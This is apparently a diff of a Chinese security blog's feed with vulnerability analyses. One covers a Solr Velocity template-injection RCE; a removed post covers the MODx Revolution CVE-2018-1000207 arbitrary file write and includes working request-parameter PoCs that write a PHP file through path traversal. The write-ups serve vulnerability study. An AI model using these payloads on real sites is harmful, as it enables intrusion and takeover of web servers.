+&lt;p&gt;从&lt;a href=&#34;https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components&#34;&gt;文档&lt;/a&gt;可以了解对于&lt;code&gt;responsewriter&lt;/code&gt;的操作有下面三个&lt;/p&gt;
 
-- `add-queryresponsewriter`
-- `update-queryresponsewriter`
-- `delete-queryresponsewriter`
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;add-queryresponsewriter&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;update-queryresponsewriter&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;delete-queryresponsewriter&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-![1572516621585](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516621585.png)
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516621585.png&#34; alt=&#34;1572516621585&#34; /&gt;&lt;/p&gt;
 
-代码中也能看到对操作名称按`-`进行分割提取出对应操作，然后由`updateNamedPlugin()`方法来完成配置文件的创建/覆盖操作，具体跟入看一下
+&lt;p&gt;代码中也能看到对操作名称按&lt;code&gt;-&lt;/code&gt;进行分割提取出对应操作，然后由&lt;code&gt;updateNamedPlugin()&lt;/code&gt;方法来完成配置文件的创建/覆盖操作，具体跟入看一下&lt;/p&gt;
 
-在`updateNamedPlugin()`中有个`verifyClass`的调用，当传入参数没有设置`runtimeLib`时会去创建class字段指定的类，所以当我们传入`VelocityResponseWriter`时，会在其初始化的时候写入对应的参数
+&lt;p&gt;在&lt;code&gt;updateNamedPlugin()&lt;/code&gt;中有个&lt;code&gt;verifyClass&lt;/code&gt;的调用，当传入参数没有设置&lt;code&gt;runtimeLib&lt;/code&gt;时会去创建class字段指定的类，所以当我们传入&lt;code&gt;VelocityResponseWriter&lt;/code&gt;时，会在其初始化的时候写入对应的参数&lt;/p&gt;
 
-![1572518046827](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572518046827.png)
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572518046827.png&#34; alt=&#34;1572518046827&#34; /&gt;&lt;/p&gt;
 
-然后返回到`handleCommands()`中把配置写入到`configoverlay.json`文件
+&lt;p&gt;然后返回到&lt;code&gt;handleCommands()&lt;/code&gt;中把配置写入到&lt;code&gt;configoverlay.json&lt;/code&gt;文件&lt;/p&gt;
 
-![1572518122216](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572518122216.png)
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572518122216.png&#34; alt=&#34;1572518122216&#34; /&gt;&lt;/p&gt;
 
-因此，通过`config api`可以重新设置`VelocityResponseWriter`的属性，为下一步加载模板提供入口
+&lt;p&gt;因此，通过&lt;code&gt;config api&lt;/code&gt;可以重新设置&lt;code&gt;VelocityResponseWriter&lt;/code&gt;的属性，为下一步加载模板提供入口&lt;/p&gt;
 
-三种命令的区别如下：
+&lt;p&gt;三种命令的区别如下：&lt;/p&gt;
 
-&gt; add- 命令都会将新配置添加到configoverlay.json，这将覆盖solrconfig.xml组件中的任何其他设置；
-&gt; update- 命令覆盖configoverlay.json中的现有设置；
-&gt; delete-命令从configoverlay.json中删除设置
+&lt;blockquote&gt;
+&lt;p&gt;add- 命令都会将新配置添加到configoverlay.json，这将覆盖solrconfig.xml组件中的任何其他设置；
+update- 命令覆盖configoverlay.json中的现有设置；
+delete-命令从configoverlay.json中删除设置&lt;/p&gt;
+&lt;/blockquote&gt;
 
+&lt;h4 id=&#34;注入自定义模板&#34;&gt;注入自定义模板&lt;/h4&gt;
 
+&lt;p&gt;在&lt;code&gt;SolrDispatchFilter&lt;/code&gt;中有有一个枚举类&lt;code&gt;Action&lt;/code&gt;，定义了每个handler的所属的操作，通过ConfigAPI更新配置时，当前的action是&lt;code&gt;PROCESS&lt;/code&gt;，因此会进入&lt;code&gt;HttpSolrCall.call()&lt;/code&gt;的&lt;code&gt;PROCESS&lt;/code&gt;分支&lt;/p&gt;
 
-#### 注入自定义模板
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572576900618.png&#34; alt=&#34;1572576900618&#34; /&gt;&lt;/p&gt;
 
-在`SolrDispatchFilter`中有有一个枚举类`Action`，定义了每个handler的所属的操作，通过ConfigAPI更新配置时，当前的action是`PROCESS`，因此会进入`HttpSolrCall.call()`的`PROCESS`分支
+&lt;p&gt;之后通过&lt;code&gt;QueryResponseWriterUtil.writeQueryResponse()&lt;/code&gt;进入&lt;code&gt;VelocityResponseWriter.write&lt;/code&gt;，在这个方法中完成&lt;code&gt;Velocity&lt;/code&gt;的解析&lt;/p&gt;
 
-![1572576900618](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572576900618.png)
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572577848829.png&#34; alt=&#34;1572577848829&#34; /&gt;&lt;/p&gt;
 
-之后通过`QueryResponseWriterUtil.writeQueryResponse()`进入`VelocityResponseWriter.write`，在这个方法中完成`Velocity`的解析
+&lt;p&gt;首先会初始化一个解析模板的引擎&lt;code&gt;VelocityEngine&lt;/code&gt;，在创建引擎的过程中会检查是否允许参数资源加载，这也就是第一个请求设置的&lt;code&gt;params.resource.loader.enabled&lt;/code&gt;属性值。由于&lt;code&gt;solr.resource.loader.enabled&lt;/code&gt;默认是开启的，所以此处只需要设置params的值&lt;/p&gt;
 
-![1572577848829](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572577848829.png)
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572577993537.png&#34; alt=&#34;1572577993537&#34; /&gt;&lt;/p&gt;
 
-首先会初始化一个解析模板的引擎`VelocityEngine`，在创建引擎的过程中会检查是否允许参数资源加载，这也就是第一个请求设置的`params.resource.loader.enabled`属性值。由于`solr.resource.loader.enabled`默认是开启的，所以此处只需要设置params的值
+&lt;p&gt;之后通过&lt;code&gt;Template.getTemplate()&lt;/code&gt;设置自定义模板，然后进入&lt;code&gt;Template.merge()&lt;/code&gt;进入AST解析，在解析过程中会调用到&lt;code&gt;ASTMethod.execute()&lt;/code&gt;方法，这个流程与之前披露的CVE-2019-11581 JIRA模板注入漏洞是一样的，不再赘述，详细可以参考&lt;a href=&#34;https://kylingit.com/blog/cve-2019-11581-atlassian-jira%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&#34;&gt;CVE-2019-11581 ATLASSIAN JIRA 未授权模板注入漏洞分析&lt;/a&gt;&lt;/p&gt;
 
-![1572577993537](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572577993537.png)
+&lt;blockquote&gt;
+&lt;p&gt;回过头看一下&lt;code&gt;Velocity&lt;/code&gt;渲染的大致流程：&lt;/p&gt;
 
-之后通过`Template.getTemplate()`设置自定义模板，然后进入`Template.merge()`进入AST解析，在解析过程中会调用到`ASTMethod.execute()`方法，这个流程与之前披露的CVE-2019-11581 JIRA模板注入漏洞是一样的，不再赘述，详细可以参考[CVE-2019-11581 ATLASSIAN JIRA 未授权模板注入漏洞分析](https://kylingit.com/blog/cve-2019-11581-atlassian-jira%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
+&lt;blockquote&gt;
+&lt;p&gt;Velocity 渲染引擎首先磁盘加载模板文件到内存，然后解析模板模板文件为 AST 结构，并对 AST 中每个节点进行初始化，第二次加载同一个模板文件时候如果开启了缓存则直接返回模板资源，通过使用资源缓存节省了从磁盘加载并重新解析为 AST 的开销。&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&gt;回过头看一下`Velocity`渲染的大致流程：
-&gt;
-&gt;&gt; Velocity 渲染引擎首先磁盘加载模板文件到内存，然后解析模板模板文件为 AST 结构，并对 AST 中每个节点进行初始化，第二次加载同一个模板文件时候如果开启了缓存则直接返回模板资源，通过使用资源缓存节省了从磁盘加载并重新解析为 AST 的开销。
-&gt;
-&gt;而`ASTMethod.execute()`方法设计之初是在`Velocity parse`解析模板的过程中，通过反射调用相关方法完成正常模板渲染动作，例如获取背景颜色、获取 text 内容、获取页面编码等，但当此处攻击者传入精心构造的数据后，利用反射执行了`java.lang.Runtime.getRuntime`，成功达到命令执行的目的
+&lt;p&gt;而&lt;code&gt;ASTMethod.execute()&lt;/code&gt;方法设计之初是在&lt;code&gt;Velocity parse&lt;/code&gt;解析模板的过程中，通过反射调用相关方法完成正常模板渲染动作，例如获取背景颜色、获取 text 内容、获取页面编码等，但当此处攻击者传入精心构造的数据后，利用反射执行了&lt;code&gt;java.lang.Runtime.getRuntime&lt;/code&gt;，成功达到命令执行的目的&lt;/p&gt;
+&lt;/blockquote&gt;
 
-调用栈
+&lt;p&gt;调用栈&lt;/p&gt;
 
-![1572575433979](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572575433979.png)
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572575433979.png&#34; alt=&#34;1572575433979&#34; /&gt;&lt;/p&gt;
 
-PoC
+&lt;p&gt;PoC&lt;/p&gt;
 
-![1572578779708](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572578779708.png)
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572578779708.png&#34; alt=&#34;1572578779708&#34; /&gt;&lt;/p&gt;
 
+&lt;p&gt;参考&lt;/p&gt;
 
-
-参考
-
-- https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components
-- https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py
-
-
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components&#34;&gt;https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py&#34;&gt;https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
 &lt;script&gt;pangu.spacingPage();&lt;/script&gt;
 </description>
@@ -2942,283 +3216,6 @@ class WindowsPipes
 &lt;p&gt;&lt;a href=&#34;https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple&#34;&gt;https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://typo3.org/security/advisory/typo3-core-sa-2018-002/&#34;&gt;https://typo3.org/security/advisory/typo3-core-sa-2018-002/&lt;/a&gt;&lt;/p&gt;
-
-&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>MODx Revolution 远程代码执行漏洞分析</title>
-      <link>https://kylingit.com/blog/modx-revolution-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
-      <pubDate>Fri, 20 Jul 2018 17:44:56 +0000</pubDate>
-      
-      <guid>https://kylingit.com/blog/modx-revolution-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
-      <description>
-
-&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
-
-&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;
-
-&lt;p&gt;近日，&lt;code&gt;MODx&lt;/code&gt;官方发布通告称其&lt;code&gt;MODx Revolution 2.6.4&lt;/code&gt;及之前的版本存在2个高危漏洞，攻击者可以通过该漏洞远程执行任意代码，从而获取网站的控制权或者删除任意文件。 本文分析其中的&lt;strong&gt;CVE-2018-1000207&lt;/strong&gt;漏洞，并分别分析MODx 2.5.1和2.6.4版本漏洞形成原因和PoC构造。&lt;/p&gt;
-
-&lt;h3 id=&#34;0x02-环境搭建&#34;&gt;0x02 环境搭建&lt;/h3&gt;
-
-&lt;p&gt;分别安装&lt;code&gt;MODx 2.5.1&lt;/code&gt;和&lt;code&gt;2.6.4&lt;/code&gt;版本&lt;/p&gt;
-
-&lt;h3 id=&#34;0x03-漏洞分析&#34;&gt;0x03 漏洞分析&lt;/h3&gt;
-
-&lt;h4 id=&#34;2-5-1版本&#34;&gt;2.5.1版本&lt;/h4&gt;
-
-&lt;p&gt;漏洞发生在&lt;code&gt;phpthumb&lt;/code&gt;模块，该模块的作用是提供缩略图对象&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1532080364911.png&#34; alt=&#34;1532080364911&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;当我们把光标放到文件系统中的图片上的时候，可以看到弹出了图片的缩略图，此时就调用了&lt;code&gt;phpthumb&lt;/code&gt;接口&lt;/p&gt;
-
-&lt;p&gt;请求接口类似这样&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;http://127.0.0.1/connectors/system/phpthumb.php?src=1.png&amp;amp;w=116&amp;amp;h=0&amp;amp;HTTP_MODAUTH=modx5b5067d920ba81.94108199_15b513c49743c49.16917110&amp;amp;f=png&amp;amp;q=90&amp;amp;wctx=mgr&amp;amp;source=1&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;可以看到几个参数描述了图片的一些基本属性，这些属性在&lt;code&gt;core/model/phpthumb/phpthumb.class.php&lt;/code&gt;中定义&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;// public:
-// START PARAMETERS (for object mode and phpThumb.php)
-// See phpthumb.readme.txt for descriptions of what each of these values are
-var $src  = null;     // SouRCe filename
-var $new  = null;     // NEW image (phpThumb.php only)
-var $w    = null;     // Width
-var $h    = null;     // Height
-var $wp   = null;     // Width  (Portrait Images Only)
-var $hp   = null;     // Height (Portrait Images Only)
-var $wl   = null;     // Width  (Landscape Images Only)
-var $hl   = null;     // Height (Landscape Images Only)
-
-// private: (should not be modified directly)
-var $sourceFilename   = null;
-var $rawImageData     = null;
-var $IMresizedData    = null;
-var $outputImageData  = null;
-var $useRawIMoutput   = false;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;从定义中也能看到，&lt;code&gt;phpthumb&lt;/code&gt;提供了两种类型的参数：&lt;code&gt;public&lt;/code&gt;和&lt;code&gt;private&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;public&lt;/code&gt;就是普通属性，包括图片长宽高等，&lt;code&gt;private&lt;/code&gt;则是一些私有属性，包括缓存目录，文件类型等，此次漏洞形成的关键就是程序并没有对两种类型的参数区分处理，以至于我们可以直接传入私有参数控制其中的变量值，从而改变程序执行逻辑。&lt;/p&gt;
-
-&lt;p&gt;当我们请求这个接口的时候，会访问&lt;code&gt;modSystemPhpThumbProcessor()&lt;/code&gt;类，其中的&lt;code&gt;process()&lt;/code&gt;方法：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public function process() {
-    $src = $this-&amp;gt;getProperty(&#39;src&#39;);
-    if (empty($src)) return $this-&amp;gt;failure();
-
-    $this-&amp;gt;unsetProperty(&#39;src&#39;);
-
-    $this-&amp;gt;getSource($this-&amp;gt;getProperty(&#39;source&#39;));
-    if (empty($this-&amp;gt;source)) $this-&amp;gt;failure($this-&amp;gt;modx-&amp;gt;lexicon(&#39;source_err_nf&#39;));
-
-    $src = $this-&amp;gt;source-&amp;gt;prepareSrcForThumb($src);
-    if (empty($src)) return &#39;&#39;;
-
-    $this-&amp;gt;loadPhpThumb();
-    /* set source and generate thumbnail */
-    $this-&amp;gt;phpThumb-&amp;gt;set($src);
-
-    /* check to see if there&#39;s a cached file of this already */
-    if ($this-&amp;gt;phpThumb-&amp;gt;checkForCachedFile()) {
-        $this-&amp;gt;phpThumb-&amp;gt;loadCache();
-        return &#39;&#39;;
-    }
-
-    /* generate thumbnail */
-    $this-&amp;gt;phpThumb-&amp;gt;generate();
-
-    /* cache the thumbnail and output */
-    $this-&amp;gt;phpThumb-&amp;gt;cache();
-    $this-&amp;gt;phpThumb-&amp;gt;output();
-    return &#39;&#39;;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到里面的几个主要操作，包括检查文件是否被缓存，以及读取缓存，设置缓存等，我们利用的就是&lt;code&gt;phpthumb&lt;/code&gt;设置缓存的方法&lt;code&gt;phpThumb-&amp;gt;cache()&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public function cache() {
-    phpthumb_functions::EnsureDirectoryExists(dirname($this-&amp;gt;cache_filename));
-    if ((file_exists($this-&amp;gt;cache_filename) &amp;amp;&amp;amp; is_writable($this-&amp;gt;cache_filename)) || is_writable(dirname($this-&amp;gt;cache_filename))) {
-        $this-&amp;gt;CleanUpCacheDirectory();
-        if ($this-&amp;gt;RenderToFile($this-&amp;gt;cache_filename) &amp;amp;&amp;amp; is_readable($this-&amp;gt;cache_filename)) {
-            chmod($this-&amp;gt;cache_filename, 0644);
-            $this-&amp;gt;RedirectToCachedFile();
-        }
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这里面关键的方法是&lt;code&gt;RenderToFile()&lt;/code&gt;，可以看到它接收参数&lt;code&gt;$this-&amp;gt;cache_filename&lt;/code&gt;，那么我们可以直接传入&lt;code&gt;cache_filename&lt;/code&gt;这个变量值。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function RenderToFile($filename) {
-    $renderfilename = $filename;
-    //一系列检查
-    if ($this-&amp;gt;RenderOutput()) {
-        if (file_put_contents($renderfilename, $this-&amp;gt;outputImageData)) {
-            $this-&amp;gt;DebugMessage(&#39;RenderToFile(&#39;.$renderfilename.&#39;) succeeded&#39;, __FILE__, __LINE__);
-            return true;
-        }
-    //...
-    return false;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;RenderToFile()&lt;/code&gt;方法里有&lt;code&gt;file_put_contents()&lt;/code&gt;函数，文件名是我们传入的&lt;code&gt;cache_filename&lt;/code&gt;，文件内容是&lt;code&gt;$this-&amp;gt;outputImageData&lt;/code&gt;。如果对内容没有校验的话意味着我们可以写入任意内容，前提是满足&lt;code&gt;$this-&amp;gt;RenderOutput()&lt;/code&gt;为真，进去看一下&lt;code&gt;RenderOutput()&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function RenderOutput() {
-    //...
-    if ($this-&amp;gt;useRawIMoutput) {
-        $this-&amp;gt;DebugMessage(&#39;RenderOutput copying $this-&amp;gt;IMresizedData (&#39;.strlen($this-&amp;gt;IMresizedData).&#39; bytes) to $this-&amp;gt;outputImage&#39;, __FILE__, __LINE__);
-        $this-&amp;gt;outputImageData = $this-&amp;gt;IMresizedData;
-        return true;
-    }
-    //...
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;在这里我们需要满足&lt;code&gt;$this-&amp;gt;useRawIMoutput&lt;/code&gt;为真，而这个变量默认值为&lt;code&gt;false&lt;/code&gt;。实际上&lt;code&gt;useRawIMoutput&lt;/code&gt;即为我们提到的私有变量，程序虽然默认定义了私有变量的值，但我们还是可以通过&lt;code&gt;post&lt;/code&gt;把值直接传进去，同时这里也没有检验文件的内容，直接把&lt;code&gt;$this-&amp;gt;IMresizedData&lt;/code&gt;赋值为&lt;code&gt;$this-&amp;gt;outputImageData&lt;/code&gt;，也就是&lt;code&gt;file_put_contents()&lt;/code&gt;所需要的第二个参数，所以到这里就能构成一个任意文件写入的漏洞。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;构造PoC：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;cache_filename=../../../payload.php&amp;amp;src=.&amp;amp;ctx=web&amp;amp;useRawIMoutput=1&amp;amp;config_prefer_imagemagick=0&amp;amp;outputImageData=&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;需要特别注意的是，此处的&lt;code&gt;cache_filename&lt;/code&gt;与网站相对路径密切相关，往上目录穿越少了反而不能写入文件，而在Windows下测试可以写入Web根目录以外的目录，因为程序内部虽然检查了目录写权限，却并没有限制一个根目录，所以严格来说这里还存在一个目录穿越漏洞。&lt;/p&gt;
-
-&lt;p&gt;这个利用在MODX 2.5.1版本及之前可以无需登录直接利用，而在2.6.4版本进行了更严格的权限检查，在处理请求之前增加了这样一段判断代码：&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;core/model/modx/modconnectorresponse.class.php&lt;/code&gt; &lt;code&gt;outputContent()&lt;/code&gt;方法&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;/* Block the user if there&#39;s no user token for the current context, and permissions are in fact required */
-if (empty($siteId) &amp;amp;&amp;amp; (!defined(&#39;MODX_REQP&#39;) || MODX_REQP === TRUE)) {
-    $this-&amp;gt;responseCode = 401;
-    $this-&amp;gt;body = $modx-&amp;gt;error-&amp;gt;failure($modx-&amp;gt;lexicon(&#39;access_denied&#39;),array(&#39;code&#39; =&amp;gt; 401));
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;所以在2.6.4版本利用需要登录权限。&lt;/p&gt;
-
-&lt;h4 id=&#34;2-6-4版本&#34;&gt;2.6.4版本&lt;/h4&gt;
-
-&lt;p&gt;那么有没有方法在2.6.4版本也能不需要权限直接写入任意文件呢？答案还是有的，只不过网站需要安装一个插件&lt;a href=&#34;https://modx.com/extras/package/gallery&#34;&gt;Gallery&lt;/a&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Gallery is a dynamic Gallery Extra for MODx Revolution. It allows you to quickly and easily put up galleries of images, sort them, tag them, and display them in a myriad of ways in the front-end of your site.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;简而言之&lt;code&gt;Gallery&lt;/code&gt; 是一个图库，可以更方便地管理网站图片。&lt;/p&gt;
-
-&lt;p&gt;在这个库中也有&lt;code&gt;phpThumb&lt;/code&gt;的相关方法，而且同样有缓存机制，不出意外同样存在任意文件写入漏洞，但是这个方法稍微复杂一些，它把文件写入cache目录，而文件名经过了一个array的反序列化再MD5，这样即使我们能写入文件，却猜不到文件名，因此a2u给出的PoC也没能直接写入文件，而是通过返回包来判断是否存在漏洞。但是经过分析，实际上我们是可以往缓存目录写入一个shell的，而且能够知道保存的文件名，下面来分析一下如何绕过这个看似复杂的流程。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1532596628836.png&#34; alt=&#34;1532596628836&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;当利用插件上传图片的时候，如果图库中已经有图片，我们就可以看到一张缩略图，请求类似这样&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;http://127.0.0.1/modx-2.6.4-pl/assets/components/gallery/connector.php?action=web/phpthumb&amp;amp;w=100&amp;amp;h=100&amp;amp;zc=1&amp;amp;src=/modx-2.6.4-pl/assets/gallery/1/cover.png&amp;amp;time=1532596253635&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;同样的，&lt;code&gt;gallery&lt;/code&gt;的&lt;code&gt;connector.php&lt;/code&gt;也接收图片属性等&lt;code&gt;public&lt;/code&gt;参数，但是此处我们并不关心，直接定位到处理写入缓存的文件&lt;code&gt;core/components/gallery/processors/web/phpthumb.php&lt;/code&gt;。漏洞形成点同样也是&lt;code&gt;file_put_contents&lt;/code&gt;参数没有经过过滤。&lt;/p&gt;
-
-&lt;p&gt;请求在进入&lt;code&gt;phpthumb.php&lt;/code&gt;之后，首先会把参数设置成一个&lt;code&gt;array&lt;/code&gt;，放在&lt;code&gt;$scriptProperties&lt;/code&gt;中，类似这样&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;array (
-  &#39;action&#39; =&amp;gt; &#39;web/phpthumb&#39;,
-  &#39;w&#39; =&amp;gt; &#39;100&#39;,
-  &#39;h&#39; =&amp;gt; &#39;100&#39;,
-  &#39;zc&#39; =&amp;gt; &#39;1&#39;,
-  &#39;src&#39; =&amp;gt; &#39;/modx-2.6.4-pl/assets/gallery/1/cover.png&#39;,
-  &#39;time&#39; =&amp;gt; &#39;1532596253635&#39;,
-)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;在调用系统&lt;code&gt;phpthumb.class.php&lt;/code&gt;模块的&lt;code&gt;RenderToFile&lt;/code&gt;之前对文件进行了一系列处理，主要关注其中几个&lt;/p&gt;
-
-&lt;p&gt;首先对&lt;code&gt;src&lt;/code&gt;文件后缀有一个判断&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (empty($ptOptions[&#39;f&#39;])) {
-    $ext = pathinfo($src, PATHINFO_EXTENSION);
-    $ext = strtolower($ext);
-    switch ($ext) {
-        case &#39;jpg&#39;:
-        case &#39;jpeg&#39;:
-        case &#39;png&#39;:
-        case &#39;gif&#39;:
-        case &#39;bmp&#39;:
-            $ptOptions[&#39;f&#39;] = $ext;
-            break;
-        default:
-            $ptOptions[&#39;f&#39;] = &#39;jpeg&#39;;
-            break;
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;如果没有指定&lt;code&gt;f&lt;/code&gt;参数的话，就根据文件后缀将&lt;code&gt;f&lt;/code&gt;赋值。也就是说，如果我们传递了&lt;code&gt;f&lt;/code&gt;参数，也就可以指定任意文件后缀，此处没有任何过滤。&lt;/p&gt;
-
-&lt;p&gt;然后判断&lt;code&gt;src&lt;/code&gt;参数是否是以&lt;code&gt;http&lt;/code&gt;开头，如果不是，则把&lt;code&gt;src&lt;/code&gt;拼接成完整的物理路径：&lt;code&gt;D:/phpStudy/PHPTutorial/WWW/modx-2.6.4-pl/assets/gallery/1/cover.png&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;/* auto-prepend base path if not a URL */
-if (strpos($src, &#39;http&#39;) === false) {
-    $basePath = $modx-&amp;gt;getOption(&#39;base_path&#39;, null, MODX_BASE_PATH);
-    if ($basePath != &#39;/&#39;) {
-        $src = str_replace(basename($basePath), &#39;&#39;, $src);
-        $src = ltrim($src, &#39;/&#39;);
-        $src = $basePath . $src;
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;接着把&lt;code&gt;src&lt;/code&gt;路径中的&lt;code&gt;:&lt;/code&gt;和&lt;code&gt;/&lt;/code&gt;替换成&lt;code&gt;_&lt;/code&gt;，也就是&lt;code&gt;D__phpStudy_PHPTutorial_WWW_modx-2.6.4-pl_assets_gallery_1_cover.png&lt;/code&gt;，这个字符串将成为最后缓存文件的文件名的前半部分。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$inputSanitized = str_replace(array(&#39;:&#39;, &#39;/&#39;), &#39;_&#39;, $src);
-$cacheFilename = $inputSanitized;
-$cacheFilename .= &#39;.&#39; . md5(serialize($scriptProperties));
-$cacheFilename .= &#39;.&#39; . (!empty($ptOptions[&#39;f&#39;]) ? $ptOptions[&#39;f&#39;] : &#39;png&#39;);
-$cacheKey = $assetsPath . &#39;cache/&#39; . $cacheFilename;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;而文件名后半部分则是&lt;code&gt;md5(serialize($scriptProperties))&lt;/code&gt;的值，把上面的array进行反序列化再MD5，最后拼接上面设置的&lt;code&gt;f&lt;/code&gt;后缀，所以最后的文件名类似&lt;code&gt;D__phpStudy_PHPTutorial_WWW_modx-2.6.4-pl_assets_gallery_1_cover.png.0f0d6092657266f9718061fb8a20730d.png&lt;/code&gt;，由于在实际利用中我们不知道网站物理路径，因此几乎无法猜出这个文件名。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;绕过方式就是利用&lt;code&gt;src&lt;/code&gt;参数，上面代码对&lt;code&gt;src&lt;/code&gt;进行了一个&lt;code&gt;http&lt;/code&gt;判断，假如我们指定&lt;code&gt;src&lt;/code&gt;以&lt;code&gt;http&lt;/code&gt;开头，就不会拼接物理路径，而反序列化时的各个参数均是我们可以控制的，这样我们最终就能得到一个文件名类似&lt;code&gt;http.md5_string.php&lt;/code&gt;的缓存文件。&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;构造PoC：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;action=web/phpthumb&amp;amp;src=http&amp;amp;f=php&amp;amp;useRawIMoutput=1&amp;amp;config_prefer_imagemagick=0&amp;amp;IMresizedData=&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;&lt;/p&gt;
-
